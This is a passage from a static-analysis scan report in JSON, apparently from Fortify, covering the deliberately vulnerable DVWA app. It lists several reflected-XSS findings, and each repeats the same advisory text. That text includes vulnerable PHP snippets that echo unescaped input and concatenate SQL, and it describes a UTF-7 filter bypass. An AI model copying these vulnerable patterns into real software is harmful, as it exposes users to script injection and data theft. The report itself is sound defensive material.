Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4628/?engineType=SCA&issue=ABCC9A8B94CD3047D11C8D01567C53E4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4633",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4633/?engineType=SCA&issue=ADCABFEA4ACA2DAC519D142100EB094C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4644",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4644/?engineType=SCA&issue=B6AFE9B3388300ACBF7D2E34B693F108"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4654",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special 